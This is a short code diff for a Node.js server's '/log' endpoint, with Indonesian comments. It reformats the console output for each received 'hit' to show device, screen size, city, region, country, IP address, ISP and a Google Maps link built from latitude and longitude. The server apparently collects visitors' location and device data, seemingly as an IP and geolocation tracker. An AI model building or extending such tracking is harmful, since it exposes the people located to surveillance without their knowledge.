@@ -26,7 +26,16 @@ app.post('/log', (req, res) => {
         receivedAt: new Date().toISOString()
     };
 
-    console.log('🎯 NEW HIT:', hit.ip, hit.city || 'Unknown');
+    // Format Log agar mudah dibaca di Railway
+    console.log(`
+🔔 DATA MASUK BARU!
+📱 DEVICE   : ${hit.ua} (Layar: ${hit.screen})
+📍 LOKASI   : ${hit.city}, ${hit.region}, ${hit.country}
+🌐 IP       : ${hit.ip}
+🏢 ISP      : ${hit.isp}
+🗺️ MAPS     : https://www.google.com/maps?q=${hit.lat},${hit.lon}
+---------------------------------------------------------------
+    `);
 
     // Save ke file JSON
     const logFile = path.join(__dirname, 'logs', 'hits.json');
